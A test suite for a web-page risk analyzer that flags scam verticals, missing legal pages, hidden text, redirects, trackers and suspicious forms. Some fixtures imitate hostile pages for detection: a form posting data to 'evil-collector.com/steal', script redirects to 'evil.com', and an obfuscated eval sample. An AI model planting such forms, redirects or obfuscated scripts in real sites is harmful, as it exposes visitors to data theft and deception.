/**
 * Tests for Domain Content Analyzer.
 *
 * Tests pure logic functions by importing analyzeContent and mocking fetch.
 * Each test group covers one analyzer module.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

// We need to test internal functions. Export them for testing by importing the module
// and using analyzeContent which calls all sub-analyzers.
// For unit tests of scoring logic, we'll build HTML fixtures and pass them through.

// Mock fetch globally
const mockFetchResponses: Array<{ url?: string; match?: RegExp; response: { ok: boolean; status: number; text?: string; json?: unknown; headers?: Record<string, string> } }> = [];

function addMockResponse(match: string | RegExp, response: Partial<{ ok: boolean; status: number; text: string; json: unknown; headers: Record<string, string> }>) {
  mockFetchResponses.push({
    match: typeof match === 'string' ? new RegExp(match.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')) : match,
    response: {
      ok: response.ok ?? true,
      status: response.status ?? 200,
      text: response.text,
      json: response.json,
      headers: response.headers ?? {},
    },
  });
}

function createMockFetch() {
  return vi.fn(async (url: string | URL | Request) => {
    const urlStr = typeof url === 'string' ? url : url instanceof URL ? url.href : url.url;

    for (const mock of mockFetchResponses) {
      if (mock.match?.test(urlStr)) {
        const h = new Map(Object.entries(mock.response.headers ?? {}));
        return {
          ok: mock.response.ok,
          status: mock.response.status,
          text: async () => mock.response.text ?? '',
          json: async () => mock.response.json ?? {},
          headers: {
            get: (name: string) => h.get(name.toLowerCase()) ?? null,
            forEach: (cb: (v: string, k: string) => void) => h.forEach((v, k) => cb(v, k)),
          },
        };
      }
    }

    // Default: return empty page
    return {
      ok: true,
      status: 200,
      text: async () => '<html><head><title>Test</title></head><body>Default test page content with enough words to pass SPA detection threshold easily</body></html>',
      json: async () => ({}),
      headers: {
        get: () => null,
        forEach: () => { /* no headers */ },
      },
    };
  });
}

// Mock fetch and dns BEFORE imports
const mockFetch = createMockFetch();
vi.stubGlobal('fetch', mockFetch);

// Mock dns to prevent real DNS lookups
vi.mock('node:dns/promises', () => ({
  default: {
    resolveTxt: async () => [],
    resolveMx: async () => { throw new Error('NXDOMAIN'); },
    resolveCaa: async () => { throw new Error('NXDOMAIN'); },
    resolve4: async () => { throw new Error('NXDOMAIN'); },
    resolve6: async () => { throw new Error('NXDOMAIN'); },
    resolveNs: async () => [],
  },
  resolveTxt: async () => [],
  resolveMx: async () => { throw new Error('NXDOMAIN'); },
  resolveCaa: async () => { throw new Error('NXDOMAIN'); },
  resolve4: async () => { throw new Error('NXDOMAIN'); },
  resolve6: async () => { throw new Error('NXDOMAIN'); },
  resolveNs: async () => [],
}));

// Import after mocking
const { analyzeContent } = await import('./domain-content-analyzer.js');

beforeEach(() => {
  mockFetchResponses.length = 0;
  mockFetch.mockClear();
});

// ─── Helper: build HTML ──────────────────────────────────────────────────────

function html(body: string, head = ''): string {
  return `<html><head>${head}<title>Test Page</title></head><body>${body}</body></html>`;
}

function setupPageResponse(pageHtml: string, headers: Record<string, string> = {}) {
  addMockResponse(/^https:\/\/test\.com/, {
    text: pageHtml,
    headers: { 'content-type': 'text/html', ...headers },
  });
  // robots.txt
  addMockResponse(/robots\.txt/, { ok: false, status: 404 });
  // External APIs — return empty/not-found
  addMockResponse(/pagespeedonline/, { json: {} });
  addMockResponse(/safebrowsing/, { json: { matches: null } });
  addMockResponse(/virustotal/, { ok: false, status: 403 });
  addMockResponse(/web\.archive\.org/, { ok: false, status: 404 });
  addMockResponse(/crt\.sh/, { json: [] });
  addMockResponse(/internetdb\.shodan/, { ok: false, status: 404 });
  addMockResponse(/openphish/, { ok: false, status: 404 });
  addMockResponse(/urlhaus/, { json: { query_status: 'no_results' } });
  addMockResponse(/phishtank/, { json: { results: { in_database: false } } });
  addMockResponse(/commoncrawl/, { ok: false, status: 404 });
  addMockResponse(/serpapi/, { ok: false, status: 403 });
  addMockResponse(/abuseipdb/, { ok: false, status: 403 });
}

// ─── 1. Keyword Scanner Tests ────────────────────────────────────────────────

describe('Keyword Scanner', () => {
  it('detects critical gambling keywords', async () => {
    setupPageResponse(html('Welcome to our casino with the best slots and jackpot games'));
    const result = await analyzeContent('https://test.com');
    expect(result.keywordRiskScore).toBeGreaterThan(0);
    expect(result.keywordMatches.some(m => m.keyword === 'casino')).toBe(true);
    expect(result.keywordMatches.some(m => m.severity === 'critical')).toBe(true);
    expect(result.detectedVertical).toBe('gambling');
  });

  it('detects nutra keywords in Russian', async () => {
    setupPageResponse(html('Средство для похудения и потеря веса без диет и без тренировок жиросжигатель'));
    const result = await analyzeContent('https://test.com');
    expect(result.keywordMatches.some(m => m.vertical === 'nutra')).toBe(true);
    expect(result.detectedVertical).toBe('nutra');
  });

  it('detects crypto keywords', async () => {
    setupPageResponse(html('Get guaranteed returns with our auto-trading bitcoin investment platform for passive income'));
    const result = await analyzeContent('https://test.com');
    expect(result.detectedVertical).toBe('crypto');
    expect(result.keywordRiskScore).toBeGreaterThanOrEqual(40);
  });

  it('returns zero score for clean content', async () => {
    setupPageResponse(html('This is a completely normal business website about software development and consulting services. We help companies build great products.'));
    const result = await analyzeContent('https://test.com');
    expect(result.keywordRiskScore).toBe(0);
    expect(result.keywordMatches).toHaveLength(0);
    expect(result.detectedVertical).toBeNull();
  });

  it('provides context around matched keywords', async () => {
    setupPageResponse(html('Our amazing casino platform offers the best experience for players worldwide'));
    const result = await analyzeContent('https://test.com');
    const match = result.keywordMatches.find(m => m.keyword === 'casino');
    expect(match).toBeDefined();
    expect(match!.context).toContain('casino');
    expect(match!.context.length).toBeGreaterThan(10);
  });

  it('detects finance keywords', async () => {
    setupPageResponse(html('Get an instant loan with guaranteed approval and no credit check required'));
    const result = await analyzeContent('https://test.com');
    expect(result.detectedVertical).toBe('finance');
    expect(result.keywordMatches.length).toBeGreaterThanOrEqual(3);
  });

  it('detects pharma keywords', async () => {
    setupPageResponse(html('Buy cheap viagra online without prescription from our discount pharmacy'));
    const result = await analyzeContent('https://test.com');
    expect(result.detectedVertical).toBe('pharma');
  });

  it('detects sweepstakes keywords', async () => {
    setupPageResponse(html('Congratulations! You have won a free iphone! Claim your prize now!'));
    const result = await analyzeContent('https://test.com');
    expect(result.detectedVertical).toBe('sweepstakes');
    expect(result.keywordRiskScore).toBeGreaterThanOrEqual(40);
  });

  it('applies non-linear scaling for keyword-heavy pages', async () => {
    setupPageResponse(html('casino slots jackpot betting рулетка ставки free spins deposit bonus покер poker sports betting'));
    const result = await analyzeContent('https://test.com');
    // kwScore > 80 → extra +10 from non-linear scaling
    expect(result.keywordRiskScore).toBeGreaterThanOrEqual(80);
  });

  it('handles multiple verticals and picks dominant', async () => {
    setupPageResponse(html('casino slots and also some weight loss pills for похудение'));
    const result = await analyzeContent('https://test.com');
    // gambling has more critical keywords → should be dominant
    expect(result.detectedVertical).toBe('gambling');
  });
});

// ─── 2. Compliance Checker Tests ─────────────────────────────────────────────

describe('Compliance Checker', () => {
  it('detects Privacy Policy link', async () => {
    setupPageResponse(html('<a href="/privacy-policy">Privacy Policy</a> Normal content with enough words for the test'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasPrivacyPolicy).toBe(true);
  });

  it('detects Terms of Service', async () => {
    setupPageResponse(html('<a href="/tos">Terms of Service</a> Normal content with enough words'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasTermsOfService).toBe(true);
  });

  it('detects contact information with email', async () => {
    setupPageResponse(html('Contact us at support@example.com for more details and enough words here'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasContactInfo).toBe(true);
  });

  it('detects Russian compliance elements', async () => {
    setupPageResponse(html('<a href="/privacy">Политика конфиденциальности</a> <a href="/terms">Пользовательское соглашение</a> Контакты: +7 999 123 4567 Отказ от ответственности'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasPrivacyPolicy).toBe(true);
    expect(result.hasTermsOfService).toBe(true);
    expect(result.hasContactInfo).toBe(true);
    expect(result.hasDisclaimer).toBe(true);
  });

  it('detects cookie consent', async () => {
    setupPageResponse(html('<div class="cookie-consent">We use cookies</div> Normal page content here with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasCookieConsent).toBe(true);
  });

  it('detects age verification', async () => {
    setupPageResponse(html('You must be 18+ to access this site. Please confirm your age. Normal content here'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasAgeVerification).toBe(true);
  });

  it('gives high compliance score when all elements present', async () => {
    setupPageResponse(html(`
      <a href="/privacy">Privacy Policy</a>
      <a href="/terms">Terms of Service</a>
      <a href="/contact">Contact Us</a> support@test.com
      <p>Individual results may vary</p>
      <a href="/about">About Us</a>
      <div class="cookie-banner">Cookie consent</div>
      <div>You must be 18+</div>
      Enough words here to pass the word count threshold easily
    `));
    const result = await analyzeContent('https://test.com');
    expect(result.complianceScore).toBeGreaterThanOrEqual(80);
  });

  it('gives zero compliance score when nothing present', async () => {
    setupPageResponse(html('Just a plain page with no legal pages at all and enough words to not be SPA'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasPrivacyPolicy).toBe(false);
    expect(result.hasTermsOfService).toBe(false);
    expect(result.hasContactInfo).toBe(false);
  });

  it('skips compliance penalty for legitimate SPA', async () => {
    // SPA = < 50 words but has analytics
    setupPageResponse(html('<script src="https://www.google-analytics.com/analytics.js"></script> app'));
    const result = await analyzeContent('https://test.com');
    // Should not get compliance penalty even though no PP/ToS detected
    // The contentRiskScore should be lower than if compliance penalty applied
    expect(result.wordCount).toBeLessThan(50);
  });

  it('does NOT skip compliance penalty for thin TDS page', async () => {
    // Thin page with no analytics, low security → NOT a legit SPA
    setupPageResponse(html('<script>window.location="https://evil.com"</script>'), {});
    const result = await analyzeContent('https://test.com');
    // Should have structure penalty for JS redirect AND compliance penalty
    expect(result.contentRiskScore).toBeGreaterThan(15);
  });
});

// ─── 3. Structure Red Flags Tests ────────────────────────────────────────────

describe('Structure Red Flags', () => {
  it('detects countdown timer', async () => {
    setupPageResponse(html('<div class="countdown" data-countdown="2026-01-01">Timer here</div> Enough words for non-SPA detection'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasCountdownTimer).toBe(true);
    expect(result.redFlags.some(f => f.type === 'countdown_timer')).toBe(true);
  });

  it('detects before/after content', async () => {
    setupPageResponse(html('See the amazing before and after results of our product with enough words'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasBeforeAfter).toBe(true);
  });

  it('detects hidden text via CSS', async () => {
    setupPageResponse(html('<div style="color: transparent; font-size: 0">hidden keywords</div> Visible content with enough words'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasHiddenText).toBe(true);
    expect(result.redFlags.some(f => f.severity === 'critical')).toBe(true);
  });

  it('detects JavaScript redirect to external URL', async () => {
    setupPageResponse(html('<script>window.location = "https://evil-site.com/landing";</script> Some content with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasExternalRedirect).toBe(true);
    expect(result.redFlags.some(f => f.type === 'js_redirect')).toBe(true);
  });

  it('detects obfuscated eval', async () => {
    setupPageResponse(html('<script>eval(atob("aGVsbG8="))</script> Normal page content with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.redFlags.some(f => f.type === 'obfuscated_js')).toBe(true);
  });

  it('detects auto-play video', async () => {
    setupPageResponse(html('<video autoplay src="promo.mp4"></video> Page with enough content words'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasAutoPlayVideo).toBe(true);
  });

  it('detects excessive iframes', async () => {
    setupPageResponse(html('<iframe src="a"></iframe><iframe src="b"></iframe><iframe src="c"></iframe> Content with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.iframeCount).toBeGreaterThanOrEqual(3);
    expect(result.redFlags.some(f => f.type === 'excessive_iframes')).toBe(true);
  });

  it('detects popup overlay', async () => {
    setupPageResponse(html('<div class="modal popup overlay" style="position: fixed; z-index: 9999; display: block">Sign up!</div> Normal content'));
    const result = await analyzeContent('https://test.com');
    expect(result.hasPopupOverlay).toBe(true);
  });

  it('returns zero structure score for clean page', async () => {
    setupPageResponse(html('<h1>Welcome</h1><p>This is a normal website about our company and services. We have been in business for many years.</p>'));
    const result = await analyzeContent('https://test.com');
    expect(result.structureRiskScore).toBe(0);
    expect(result.redFlags).toHaveLength(0);
  });

  it('stacks multiple red flags', async () => {
    setupPageResponse(html(`
      <div class="countdown">Timer</div>
      <div style="font-size: 0">hidden</div>
      <script>window.location = "https://other.com"</script>
      <script>eval(atob("test"))</script>
      Content with enough words for analysis threshold
    `));
    const result = await analyzeContent('https://test.com');
    expect(result.redFlags.length).toBeGreaterThanOrEqual(3);
    expect(result.structureRiskScore).toBeGreaterThanOrEqual(50);
  });
});

// ─── 4. Redirect Analysis Tests ──────────────────────────────────────────────

describe('Redirect Analysis', () => {
  it('tracks redirect chain', async () => {
    // Simulate redirect: test.com → redirect.com → final.com
    addMockResponse(/^https:\/\/test\.com$/, {
      ok: false, status: 302,
      headers: { location: 'https://redirect.com' },
    });
    addMockResponse(/^https:\/\/redirect\.com$/, {
      ok: false, status: 302,
      headers: { location: 'https://final.com' },
    });
    addMockResponse(/^https:\/\/final\.com$/, {
      text: html('Final page content with enough words for the analysis'),
    });
    // Mock external APIs
    addMockResponse(/robots\.txt/, { ok: false, status: 404 });
    addMockResponse(/pagespeedonline|safebrowsing|virustotal|web\.archive|crt\.sh|internetdb|openphish|urlhaus|phishtank|commoncrawl|serpapi|abuseipdb/, { ok: false, status: 404 });

    const result = await analyzeContent('https://test.com');
    expect(result.redirectCount).toBeGreaterThanOrEqual(2);
    expect(result.redirectChain).toContain('https://test.com');
    expect(result.finalUrl).toBeDefined();
  });

  it('detects URL mismatch with declared URL', async () => {
    addMockResponse(/^https:\/\/declared\.com$/, {
      ok: false, status: 302,
      headers: { location: 'https://actual-landing.xyz' },
    });
    addMockResponse(/^https:\/\/actual-landing\.xyz$/, {
      text: html('Landing page content with enough words'),
    });
    addMockResponse(/robots\.txt|pagespeedonline|safebrowsing|virustotal|web\.archive|crt\.sh|internetdb|openphish|urlhaus|phishtank|commoncrawl|serpapi|abuseipdb/, { ok: false, status: 404 });

    const result = await analyzeContent('https://declared.com', 'https://declared.com');
    expect(result.urlMismatch).toBe(true);
    expect(result.redirectRiskScore).toBeGreaterThan(0);
  });

  it('gives zero redirect score for no redirects', async () => {
    setupPageResponse(html('Direct page with no redirects and enough words for analysis'));
    const result = await analyzeContent('https://test.com');
    expect(result.redirectCount).toBe(1);
    expect(result.redirectRiskScore).toBe(0);
  });
});

// ─── 5. Risk Scoring Model Tests ─────────────────────────────────────────────

describe('Risk Scoring Model', () => {
  it('gives low score (0-10) for clean site', async () => {
    setupPageResponse(html(`
      <a href="/privacy">Privacy Policy</a>
      <a href="/terms">Terms of Service</a>
      Contact: support@test.com
      <a href="/about">About Us</a>
      <p>This is a legitimate business website providing professional services to our valued customers worldwide.</p>
      <script type="application/ld+json">{"@type":"Organization","name":"Test Corp"}</script>
      <script src="https://www.google-analytics.com/analytics.js"></script>
    `), { 'strict-transport-security': 'max-age=31536000', 'content-security-policy': "default-src 'self'", 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'referrer-policy': 'strict-origin' });
    const result = await analyzeContent('https://test.com');
    expect(result.contentRiskScore).toBeLessThanOrEqual(15);
  });

  it('gives high score (50+) for gambling landing page', async () => {
    setupPageResponse(html('Welcome to our casino! Play slots and win the jackpot. Free spins and deposit bonus available. Betting on sports.'));
    const result = await analyzeContent('https://test.com');
    expect(result.contentRiskScore).toBeGreaterThanOrEqual(30);
    expect(result.keywordRiskScore).toBeGreaterThanOrEqual(60);
  });

  it('penalizes thin content (< 20 words)', async () => {
    setupPageResponse(html('Loading...'));
    const result = await analyzeContent('https://test.com');
    // Thin content with no analytics → penalty
    expect(result.wordCount).toBeLessThan(20);
  });

  it('applies URL mismatch direct penalty (+15)', async () => {
    addMockResponse(/^https:\/\/safe\.com$/, {
      ok: false, status: 302,
      headers: { location: 'https://scam.xyz' },
    });
    addMockResponse(/^https:\/\/scam\.xyz$/, {
      text: html('Normal looking page with enough words for analysis and no keywords'),
    });
    addMockResponse(/robots\.txt|pagespeedonline|safebrowsing|virustotal|web\.archive|crt\.sh|internetdb|openphish|urlhaus|phishtank|commoncrawl|serpapi|abuseipdb/, { ok: false, status: 404 });

    const result = await analyzeContent('https://safe.com', 'https://safe.com');
    expect(result.urlMismatch).toBe(true);
    // Should have at least 15 points from mismatch + redirect cross-domain
    expect(result.contentRiskScore).toBeGreaterThanOrEqual(15);
  });

  it('caps bonuses at -25', async () => {
    // Site with maximum possible bonuses
    setupPageResponse(html(`
      <a href="/privacy">Privacy Policy</a>
      <a href="/terms">Terms</a>
      Contact: info@test.com
      <a href="/about">About</a>
      <p>Disclaimer: results may vary</p>
      <div class="cookie-notice">Cookies</div>
      <script type="application/ld+json">{"@type":"Organization"}</script>
      <script src="https://www.google-analytics.com/analytics.js"></script>
      This is a well established company providing legitimate services for over twenty years.
    `), {
      'strict-transport-security': 'max-age=31536000',
      'content-security-policy': "default-src 'self'",
      'x-frame-options': 'DENY',
      'x-content-type-options': 'nosniff',
      'referrer-policy': 'strict-origin',
      'permissions-policy': 'camera=()',
    });
    const result = await analyzeContent('https://test.com');
    // Even with max bonuses, score should be >= 0
    expect(result.contentRiskScore).toBeGreaterThanOrEqual(0);
  });

  it('Cloudflare sites skip IP-based penalties', async () => {
    setupPageResponse(
      html('Normal page with enough words for analysis here on this page'),
      { server: 'cloudflare', 'cf-ray': '123abc' },
    );
    const result = await analyzeContent('https://test.com');
    // Should not have inflated score from Cloudflare IP checks
    expect(result.contentRiskScore).toBeLessThan(30);
  });
});

// ─── 6. Page Metrics Tests ───────────────────────────────────────────────────

describe('Page Metrics', () => {
  it('counts words correctly', async () => {
    setupPageResponse(html('One two three four five six seven eight nine ten'));
    const result = await analyzeContent('https://test.com');
    expect(result.wordCount).toBeGreaterThanOrEqual(10);
  });

  it('detects page language as Russian', async () => {
    setupPageResponse(html('Это тестовая страница на русском языке с достаточным количеством слов для определения языка'));
    const result = await analyzeContent('https://test.com');
    expect(result.pageLanguage).toBe('ru');
  });

  it('detects page language as English', async () => {
    setupPageResponse(html('This is a test page in English with enough words to detect the language properly'));
    const result = await analyzeContent('https://test.com');
    expect(result.pageLanguage).toBe('en');
  });

  it('extracts page title', async () => {
    setupPageResponse('<html><head><title>My Test Page</title></head><body>Content with enough words</body></html>');
    const result = await analyzeContent('https://test.com');
    expect(result.pageTitle).toBe('My Test Page');
  });

  it('extracts meta description', async () => {
    setupPageResponse('<html><head><meta name="description" content="Test description"><title>T</title></head><body>Content words</body></html>');
    const result = await analyzeContent('https://test.com');
    expect(result.pageDescription).toBe('Test description');
  });

  it('extracts OpenGraph tags', async () => {
    setupPageResponse('<html><head><meta property="og:title" content="OG Title"><meta property="og:type" content="website"><title>T</title></head><body>Content</body></html>');
    const result = await analyzeContent('https://test.com');
    expect(result.ogTags).toBeDefined();
    expect(result.ogTags!['title']).toBe('OG Title');
    expect(result.ogTags!['type']).toBe('website');
  });

  it('counts links and external links', async () => {
    setupPageResponse(html('<a href="/internal">Int</a><a href="https://external.com">Ext</a><a href="https://other.org">Ext2</a> Words'));
    const result = await analyzeContent('https://test.com');
    expect(result.totalLinks).toBeGreaterThanOrEqual(3);
    expect(result.externalLinks).toBeGreaterThanOrEqual(2);
    expect(result.outboundDomains.length).toBeGreaterThanOrEqual(2);
  });

  it('counts scripts and iframes', async () => {
    setupPageResponse(html('<script src="a.js"></script><script src="b.js"></script><iframe src="c.html"></iframe> Content'));
    const result = await analyzeContent('https://test.com');
    expect(result.scriptCount).toBeGreaterThanOrEqual(2);
    expect(result.iframeCount).toBeGreaterThanOrEqual(1);
  });

  it('counts forms', async () => {
    setupPageResponse(html('<form action="/submit"><input name="email"></form><form action="/login"><input name="pass"></form> Content'));
    const result = await analyzeContent('https://test.com');
    expect(result.formCount).toBeGreaterThanOrEqual(2);
  });
});

// ─── 7. Security Headers Tests ───────────────────────────────────────────────

describe('Security Headers', () => {
  it('gives high security score with all headers', async () => {
    setupPageResponse(html('Secure page content with enough words'), {
      'strict-transport-security': 'max-age=31536000',
      'content-security-policy': "default-src 'self'",
      'x-frame-options': 'SAMEORIGIN',
      'x-content-type-options': 'nosniff',
      'referrer-policy': 'strict-origin-when-cross-origin',
      'permissions-policy': 'camera=()',
    });
    const result = await analyzeContent('https://test.com');
    expect(result.securityHeaders.securityScore).toBe(100);
    expect(result.securityHeaders.hasHsts).toBe(true);
    expect(result.securityHeaders.hasCsp).toBe(true);
  });

  it('gives zero security score with no headers', async () => {
    setupPageResponse(html('Insecure page content with enough words'), {});
    const result = await analyzeContent('https://test.com');
    expect(result.securityHeaders.securityScore).toBe(0);
    expect(result.securityHeaders.hasHsts).toBe(false);
  });

  it('captures server header', async () => {
    setupPageResponse(html('Page with enough words'), { server: 'nginx/1.24' });
    const result = await analyzeContent('https://test.com');
    expect(result.securityHeaders.serverHeader).toBe('nginx/1.24');
  });
});

// ─── 8. TLD Risk Tests ──────────────────────────────────────────────────────

describe('TLD Risk', () => {
  it('scores .com as low risk', async () => {
    setupPageResponse(html('Content with enough words'));
    const result = await analyzeContent('https://test.com');
    expect(result.tldRisk.risk).toBe('low');
    expect(result.tldRisk.score).toBe(5);
  });

  it('scores .xyz as high risk', async () => {
    addMockResponse(/^https:\/\/scam\.xyz/, { text: html('Content with enough words') });
    addMockResponse(/robots\.txt|pagespeedonline|safebrowsing|virustotal|web\.archive|crt\.sh|internetdb|openphish|urlhaus|phishtank|commoncrawl|serpapi|abuseipdb/, { ok: false, status: 404 });
    const result = await analyzeContent('https://scam.xyz');
    expect(result.tldRisk.risk).toBe('high');
    expect(result.tldRisk.score).toBe(80);
  });

  it('scores .io as medium risk', async () => {
    addMockResponse(/^https:\/\/app\.io/, { text: html('Content') });
    addMockResponse(/robots\.txt|pagespeedonline|safebrowsing|virustotal|web\.archive|crt\.sh|internetdb|openphish|urlhaus|phishtank|commoncrawl|serpapi|abuseipdb/, { ok: false, status: 404 });
    const result = await analyzeContent('https://app.io');
    expect(result.tldRisk.risk).toBe('medium');
  });
});

// ─── 9. LLM Context Tests ───────────────────────────────────────────────────

describe('LLM Context', () => {
  it('generates analysis summary string', async () => {
    setupPageResponse(html('Normal page content with enough words for proper analysis'));
    const result = await analyzeContent('https://test.com');
    expect(result.analysisSummary).toBeDefined();
    expect(result.analysisSummary.length).toBeGreaterThan(50);
    expect(result.analysisSummary).toContain('Content Risk Score');
  });

  it('generates structured llmContext object', async () => {
    setupPageResponse(html('Normal page content with enough words'));
    const result = await analyzeContent('https://test.com');
    expect(result.llmContext).toBeDefined();
    expect(result.llmContext['content_risk_score']).toBeDefined();
    expect(result.llmContext['compliance']).toBeDefined();
    expect(result.llmContext['page_metrics']).toBeDefined();
  });

  it('includes keyword matches in LLM context', async () => {
    setupPageResponse(html('Buy casino slots and play poker games with bonus'));
    const result = await analyzeContent('https://test.com');
    const ctx = result.llmContext as Record<string, unknown>;
    expect(ctx['keyword_matches_critical']).toBeDefined();
    expect((ctx['keyword_matches_critical'] as string[]).length).toBeGreaterThan(0);
  });
});

// ─── 10. Third-party Scripts Tests ───────────────────────────────────────────

describe('Third-party Scripts', () => {
  it('detects Google Analytics', async () => {
    setupPageResponse(html('<script src="https://www.google-analytics.com/analytics.js"></script> Content with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.thirdPartyScripts.analytics).toContain('Google Analytics');
  });

  it('detects Facebook Pixel inline', async () => {
    setupPageResponse(html("<script>fbq('init', '123456');</script> Content with enough words here"));
    const result = await analyzeContent('https://test.com');
    expect(result.thirdPartyScripts.advertising.some(s => s.includes('Facebook'))).toBe(true);
  });

  it('detects Keitaro TDS as suspicious', async () => {
    setupPageResponse(html('<script src="https://keitaro.io/tracker.js"></script> Content with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.thirdPartyScripts.suspicious.some(s => s.includes('Keitaro'))).toBe(true);
  });

  it('detects GTM', async () => {
    setupPageResponse(html('<script src="https://www.googletagmanager.com/gtm.js?id=GTM-XXXX"></script> Content words'));
    const result = await analyzeContent('https://test.com');
    expect(result.thirdPartyScripts.analytics).toContain('Google Tag Manager');
  });

  it('detects Yandex Metrica inline', async () => {
    setupPageResponse(html("<script>ym(12345678, 'init');</script> Content with enough words"));
    const result = await analyzeContent('https://test.com');
    expect(result.thirdPartyScripts.analytics.some(s => s.includes('Yandex'))).toBe(true);
  });
});

// ─── 11. Form Analysis Tests ─────────────────────────────────────────────────

describe('Form Analysis', () => {
  it('detects personal data collection', async () => {
    setupPageResponse(html('<form action="/submit"><input name="email"><input name="phone"><input name="name"></form> Content'));
    const result = await analyzeContent('https://test.com');
    expect(result.formAnalysis.collectsPersonalData).toBe(true);
  });

  it('detects payment data collection', async () => {
    setupPageResponse(html('<form action="/pay"><input name="card_number"><input name="cvv"><input name="billing_address"></form> Content'));
    const result = await analyzeContent('https://test.com');
    expect(result.formAnalysis.collectsPaymentData).toBe(true);
  });

  it('detects external form targets', async () => {
    setupPageResponse(html('<form action="https://evil-collector.com/steal"><input name="data"></form> Content with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.formAnalysis.externalFormTargets).toContain('evil-collector.com');
  });

  it('counts forms correctly', async () => {
    setupPageResponse(html('<form><input></form><form><input></form><form><input></form> Content'));
    const result = await analyzeContent('https://test.com');
    expect(result.formAnalysis.forms.length).toBe(3);
  });
});

// ─── 12. Link Reputation Tests ───────────────────────────────────────────────

describe('Link Reputation', () => {
  it('detects URL shortener links', async () => {
    setupPageResponse(html('<a href="https://bit.ly/abc">Click</a> Content with enough words'));
    const result = await analyzeContent('https://test.com');
    expect(result.linkReputation.shortenerLinks).toContain('bit.ly');
  });

  it('detects affiliate network links', async () => {
    setupPageResponse(html('<a href="https://www.clickbank.net/offer">Buy</a> Content words'));
    const result = await analyzeContent('https://test.com');
    expect(result.linkReputation.affiliateLinks.length).toBeGreaterThan(0);
  });

  it('detects tracker links', async () => {
    setupPageResponse(html('<a href="https://voluum.com/track">Track</a> Content with words'));
    const result = await analyzeContent('https://test.com');
    expect(result.linkReputation.trackerLinks.length).toBeGreaterThan(0);
  });
});

// ─── 13. Structured Data Tests ───────────────────────────────────────────────

describe('Structured Data', () => {
  it('detects JSON-LD', async () => {
    setupPageResponse(html('<script type="application/ld+json">{"@type":"Organization","name":"Test"}</script> Content'));
    const result = await analyzeContent('https://test.com');
    expect(result.structuredData.hasJsonLd).toBe(true);
    expect(result.structuredData.schemaTypes).toContain('Organization');
  });

  it('detects multiple schema types', async () => {
    setupPageResponse(html(`
      <script type="application/ld+json">{"@type":"WebSite","name":"Test"}</script>
      <script type="application/ld+json">{"@type":"Organization","name":"Corp"}</script>
      Content with enough words
    `));
    const result = await analyzeContent('https://test.com');
    expect(result.structuredData.schemaTypes).toContain('WebSite');
    expect(result.structuredData.schemaTypes).toContain('Organization');
    expect(result.structuredData.legitimacyBonus).toBeGreaterThan(10);
  });

  it('returns no structured data for plain pages', async () => {
    setupPageResponse(html('Just a plain page with no structured data and enough words'));
    const result = await analyzeContent('https://test.com');
    expect(result.structuredData.hasJsonLd).toBe(false);
    expect(result.structuredData.schemaTypes).toHaveLength(0);
  });
});
